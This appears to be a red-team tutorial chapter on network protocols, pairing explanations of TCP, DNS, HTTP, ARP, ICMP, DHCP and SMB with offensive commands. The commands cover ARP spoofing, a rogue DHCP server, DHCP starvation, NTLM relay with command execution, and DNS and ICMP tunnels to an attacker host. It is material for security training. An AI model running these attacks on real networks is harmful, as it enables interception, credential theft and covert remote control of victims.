# Core Protocols

**TCP: Transmission Control Protocol**

TCP provides reliable, ordered, connection-oriented communication. It guarantees delivery by acknowledging (lol ACK) received data and retransmitting what's lost.

**The Three-Way Handshake:**

```
Client → [SYN]         → Server    "I want to connect, my seq is X"
Client ← [SYN-ACK]    ← Server    "OK, my seq is Y, I acknowledge X+1"
Client → [ACK]         → Server    "I acknowledge Y+1 — connection open"
```

Each side maintains a **sequence number** tracking bytes sent. These are initialized with a random **ISN (Initial Sequence Number)** \[modern systems randomize this to prevent prediction attacks, though embedded and legacy systems sometimes don't.]

**TCP connection teardown (four-way):**

```
Client → [FIN]    "I'm done sending"
Client ← [ACK]    "Got it"
Client ← [FIN]    "I'm done too"
Client → [ACK]    "Got it — connection closed"
```

**TCP Flags:**

| Flag | Hex  | Meaning                              |
| ---- | ---- | ------------------------------------ |
| SYN  | 0x02 | Synchronize — initiate connection    |
| ACK  | 0x10 | Acknowledge received data            |
| FIN  | 0x01 | Finish — graceful close              |
| RST  | 0x04 | Reset — abrupt termination           |
| PSH  | 0x08 | Push data immediately to application |
| URG  | 0x20 | Urgent data                          |

**Offensive relevance:**

* **SYN scanning** sends SYN packets and reads responses without completing the handshake. SYN-ACK = open. RST = closed. No response = filtered.
* **RST injection** abruptly terminates established sessions — useful for DoS or session disruption
* **SYN floods** overwhelm a target's connection table with half-open connections, exhausting resources
* **TCP sequence prediction** was historically exploitable on systems with predictable ISNs

**UDP: User Datagram Protocol**

UDP is connectionless. No handshake, no acknowledgment, no ordering, no retransmission. Just send and hope. Fast, low-overhead, but unreliable.

Services that use UDP: DNS (53), DHCP (67/68), SNMP (161), TFTP (69), NTP (123), Syslog (514), many game servers and VoIP.

**Offensive relevance:**

* UDP scanning is slow and unreliable: no response could mean open (the application is ignoring the UDP probe), filtered, or packet loss
* UDP services are often less hardened and monitored than TCP equivalents
* SNMP on UDP 161 with community string `public` is a classic finding
* UDP-based services often lack authentication by design (NTP, syslog)

bash

```bash
# UDP scan with nmap
nmap -sU -p 53,67,68,69,123,161,500 192.168.1.1

# Fast UDP scan of top ports
nmap -sU --top-ports 20 192.168.1.0/24
```

**DNS: Domain Name System**

DNS is a distributed hierarchical database that maps domain names to IP addresses (and much more). It's fundamental infrastructure.. almost everything depends on it.

**How resolution works:**

```
You type google.com
    ↓
Your OS checks local cache → /etc/hosts → asks configured resolver (usually your router or ISP)
    ↓
Recursive resolver checks its cache → if miss, asks root nameservers → TLD (.com) servers → google.com authoritative server
    ↓
Returns: google.com → 142.250.80.46
```

**Record types:**

| Record | Purpose          | Red team relevance                                                           |
| ------ | ---------------- | ---------------------------------------------------------------------------- |
| A      | IPv4 address     | Primary target for enumeration                                               |
| AAAA   | IPv6 address     | Often overlooked, may reveal more hosts                                      |
| MX     | Mail server      | Identifies mail infrastructure                                               |
| NS     | Nameserver       | Primary target for zone transfer attempts                                    |
| CNAME  | Alias            | May reveal internal/staging hostnames                                        |
| TXT    | Arbitrary text   | <p>SPF, DKIM, domain verification tokens </p><p>often leak internal info</p> |
| PTR    | Reverse lookup   | <p>IP → name </p><p>reveals hostnames for known IPs</p>                      |
| SOA    | Zone authority   | Serial numbers, admin email, refresh intervals                               |
| SRV    | Service location | Reveals internal services (used heavily in AD)                               |

**Offensive techniques:**

_Zone transfer (AXFR):_

bash

```bash
# Attempt zone transfer from authoritative nameserver
dig axfr @ns1.target.com target.com

# If successful, dumps every record in the zone
# This is a complete network map handed to you
```

_DNS enumeration:_

bash

```bash
# Basic record queries
dig A target.com
dig MX target.com
dig NS target.com
dig TXT target.com
dig SOA target.com
dig ANY target.com @ns1.target.com

# Reverse lookup
dig -x 192.168.1.10

# Enumerate a range of IPs via reverse lookup
for i in $(seq 1 254); do
  result=$(dig -x 192.168.1.$i +short)
  [ -n "$result" ] && echo "192.168.1.$i → $result"
done
```

_Subdomain enumeration:_

bash

```bash
# Brute-force with wordlist
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Passive enumeration (certificate transparency, APIs)
subfinder -d target.com
amass enum -passive -d target.com

# Brute force with dnsx
cat subdomains.txt | dnsx -d target.com -resp
```

_DNS tunneling:_

bash

```bash
# dnscat2 — full bidirectional C2 over DNS
# On your nameserver (must control NS record for tunnel.yourdomain.com)
ruby dnscat2.rb tunnel.yourdomain.com

# On victim
./dnscat2 tunnel.yourdomain.com
```

**HTTP and HTTPS**

HTTP (HyperText Transfer Protocol) is a stateless request-response protocol operating at Layer 7. A client sends a request; a server sends a response.

**HTTP request anatomy:**

```
GET /login HTTP/1.1                   ← Method, path, version
Host: target.com                      ← Required in HTTP/1.1
User-Agent: Mozilla/5.0               ← Browser/client identification
Cookie: session=abc123                ← Session tokens
Accept: text/html,application/json    ← What formats the client accepts
Authorization: Bearer eyJhbGc...      ← Auth token if present
Content-Type: application/json        ← For POST/PUT requests
Content-Length: 42                    ← Length of body
                                      ← Blank line separates headers from body
{"username":"admin","password":"x"}   ← Body (POST/PUT only)
```

**HTTP methods:**

| Method  | Purpose                 | Red team notes                           |
| ------- | ----------------------- | ---------------------------------------- |
| GET     | Retrieve resource       | Parameters in URL — logged everywhere    |
| POST    | Submit data             | Body not in URL — but still logged       |
| PUT     | Upload/replace resource | May allow file upload if not restricted  |
| DELETE  | Remove resource         | Should require authorization             |
| OPTIONS | List allowed methods    | Reveals what verbs the server accepts    |
| HEAD    | Headers only, no body   | Fingerprinting, bypasses some WAF rules  |
| PATCH   | Partial update          | Sometimes has weaker validation than PUT |

**HTTP response codes that matter:**

| Code    | Meaning                           | Notes                                              |
| ------- | --------------------------------- | -------------------------------------------------- |
| 200     | OK                                | Request succeeded                                  |
| 301/302 | Redirect                          | Note where you're being redirected                 |
| 400     | Bad Request                       | Your request was malformed                         |
| 401     | Unauthorized                      | Authentication required                            |
| 403     | Forbidden                         | Authenticated but no permission — try bypasses     |
| 404     | Not Found                         | Path doesn't exist — or does it?                   |
| 405     | Method Not Allowed                | Try different HTTP methods                         |
| 500     | Internal Server Error             | Application error — potentially reveals stack info |
| 502/503 | Bad Gateway / Service Unavailable | Load balancer / upstream issue                     |

**Key headers for attackers:**

| Header                      | Direction | Relevance                                              |
| --------------------------- | --------- | ------------------------------------------------------ |
| `Host`                      | Request   | Change to access other vhosts on same IP               |
| `X-Forwarded-For`           | Request   | Bypass IP-based restrictions                           |
| `Referer`                   | Request   | Can leak internal URLs in logs                         |
| `User-Agent`                | Request   | Bypass bot detection, WAF rules                        |
| `Cookie`                    | Request   | Session tokens — target for hijacking                  |
| `Authorization`             | Request   | Bearer tokens, Basic auth                              |
| `Set-Cookie`                | Response  | Look for HttpOnly, Secure flags (absence is a finding) |
| `Server`                    | Response  | Version disclosure                                     |
| `X-Powered-By`              | Response  | Technology disclosure (PHP version, ASP.NET version)   |
| `Content-Security-Policy`   | Response  | Absence or weak policy is a finding                    |
| `Strict-Transport-Security` | Response  | Absence allows SSL stripping                           |

**HTTPS/TLS:** HTTPS is HTTP inside TLS. TLS encrypts the payload but the **SNI (Server Name Indication)** in the ClientHello is still visible to network observers... they can see which domain you're connecting to even without decrypting the session.

TLS attack surface: expired or self-signed certificates, weak cipher suites (RC4, DES, export ciphers), old protocol versions (SSLv3, TLS 1.0/1.1), SSL stripping (when HSTS is absent), certificate mismatches indicating proxying/inspection.

**ARP:Address Resolution Protocol**

ARP maps IP addresses to MAC addresses on a local network. When your machine wants to send a packet to `192.168.1.1`, it first needs to know the MAC address for that IP so it can construct the Ethernet frame.

**ARP process:**

```
Host A:  "Who has 192.168.1.1? Tell 192.168.1.10"  → broadcast to all
Router:  "192.168.1.1 is at AA:BB:CC:DD:EE:FF"      → unicast reply
Host A:  Caches the mapping, sends the frame
```

ARP cache entries expire after a few minutes.

**The fundamental flaw:** ARP is stateless and completely unauthenticated. Any host can send an **unsolicited gratuitous ARP reply** claiming any IP-to-MAC mapping. There is no verification mechanism. This is by design, it was created for speed and simplicity on trusted LANs. The trust model has been completely wrong for 40 years.

**ARP spoofing / ARP poisoning:**

Send forged ARP replies to both the victim and the gateway, claiming that your MAC address corresponds to the other party's IP. Both update their ARP caches. Traffic flows through you.

```
Normal:
  Victim ARP cache:  192.168.1.1 → AA:BB:CC:DD:EE:FF (real gateway MAC)
  
After poisoning:
  Victim ARP cache:  192.168.1.1 → 11:22:33:44:55:66 (attacker MAC)
  Gateway ARP cache: 192.168.1.50 → 11:22:33:44:55:66 (attacker MAC)
```

bash

```bash
# Enable IP forwarding (so traffic still reaches its destination)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison the victim (tell victim our MAC = gateway IP)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Poison the gateway (tell gateway our MAC = victim IP)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# Now capture traffic
tcpdump -i eth0 -w capture.pcap host 192.168.1.50

# Or use a more complete tool
ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//
```

From this MitM position: capture plaintext credentials, harvest NTLM hashes for relay or cracking, downgrade HTTPS (if no HSTS), inject content into HTTP traffic.

**ICMP: Internet Control Message Protocol**

ICMP is a Layer 3 protocol used for diagnostics, error reporting, and network management. It rides inside IP packets (protocol number 1).

**Common ICMP message types:**

| Type | Name                    | Used by                  |
| ---- | ----------------------- | ------------------------ |
| 0    | Echo Reply              | ping response            |
| 3    | Destination Unreachable | port/host unreachable    |
| 5    | Redirect                | routing optimization     |
| 8    | Echo Request            | ping                     |
| 11   | Time Exceeded           | TTL expired (traceroute) |

**TTL (Time To Live):** Every IP packet has a TTL field that decrements by 1 at each router hop. When it hits 0, the router drops the packet and sends an ICMP Type 11 (Time Exceeded) back to the source. Traceroute exploits this by sending packets with incrementing TTLs (1, 2, 3...) to map each hop.

**Default TTL values reveal OS:**

| OS         | Default TTL |
| ---------- | ----------- |
| Linux/Unix | 64          |
| Windows    | 128         |
| Cisco IOS  | 255         |
| Solaris    | 255         |

By the time a packet reaches you, TTL has been decremented by the number of hops. So a received TTL of 127 on a Windows-default packet means 1 hop away. A received TTL of 61 on a Linux-default packet means 3 hops away. Useful for rough OS fingerprinting and network topology mapping.

**Offensive uses:**

bash

```bash
# Host discovery
ping 192.168.1.1
nmap -sn -PE 192.168.1.0/24   # ICMP echo sweep

# Traceroute
traceroute target.com          # Linux — UDP probes by default
tracert target.com             # Windows — ICMP by default
nmap --traceroute target.com   # nmap traceroute

# ICMP tunneling
ptunnel -p <attacker_ip> -lp 8080 -da <target_ip> -dp 22
ssh -p 8080 user@localhost
```

**DHCP: Dynamic Host Configuration Protocol**

DHCP automatically assigns network configuration to clients: IP address, subnet mask, default gateway, DNS servers, lease duration.

**DORA process:**

```
Client:  DHCP Discover → broadcast "I need an IP address"
Server:  DHCP Offer    → "Here, take 192.168.1.50/24 for 24 hours"
Client:  DHCP Request  → broadcast "I'll take the offer from server X"
Server:  DHCP ACK      → "Confirmed, it's yours"
```

Note that Discover and Request are broadcast — every host on the segment sees them. The first server to respond wins (sort of — the client explicitly requests by server ID).

**Attacks:**

_DHCP Starvation_: flood the network with DISCOVER messages using spoofed source MACs, exhausting the IP pool. Legitimate clients get no addresses.

bash

```bash
# Using yersinia
yersinia dhcp -attack 1 -interface eth0

# Using dhcpstarv
dhcpstarv -i eth0
```

_Rogue DHCP Server_: set up your own DHCP server. Whoever responds faster than the legitimate server wins. You control what gateway and DNS server victims get= instant MitM positioning without any ARP spoofing.

bash

```bash
# dnsmasq as rogue DHCP
dnsmasq --interface=eth0 \
        --dhcp-range=192.168.1.100,192.168.1.200,12h \
        --dhcp-option=3,192.168.1.5 \   # our IP as gateway
        --dhcp-option=6,192.168.1.5 \   # our IP as DNS
        --no-daemon
```

**SMB: Server Message Block**

SMB is Windows' native file sharing protocol, running on TCP port 445. It's one of the most exploited protocols in Windows environments because it's everywhere, it's trusted, and it's been the source of catastrophic vulnerabilities.

**Versions:**

* **SMBv1** — ancient, insecure, used by EternalBlue/MS17-010. Should be disabled everywhere. Still found.
* **SMBv2** — introduced in Vista, significant redesign
* **SMBv3** — introduced in Windows 8/2012, adds encryption

**What SMB exposes:**

* File shares (including administrative shares: `C$`, `ADMIN$`, `IPC$`)
* Printer sharing
* Named pipes (used for IPC between processes)
* User authentication (NTLM or Kerberos)

**Enumeration:**

bash

```bash
# Null session (no credentials) — check if anonymous access works
smbclient -L //192.168.1.10 -N
crackmapexec smb 192.168.1.0/24

# Enumerate with credentials
crackmapexec smb 192.168.1.0/24 -u username -p password --shares

# Comprehensive enumeration
enum4linux -a 192.168.1.10

# nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.10
nmap --script smb-vuln-ms17-010 192.168.1.10
```

**NTLM relay:**

bash

```bash
# Step 1: Capture authentication attempts with Responder
responder -I eth0 -rdwv

# Step 2: Relay captured hashes to other machines
ntlmrelayx.py -tf targets.txt -smb2support

# Step 3: Try to execute commands on relay targets
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
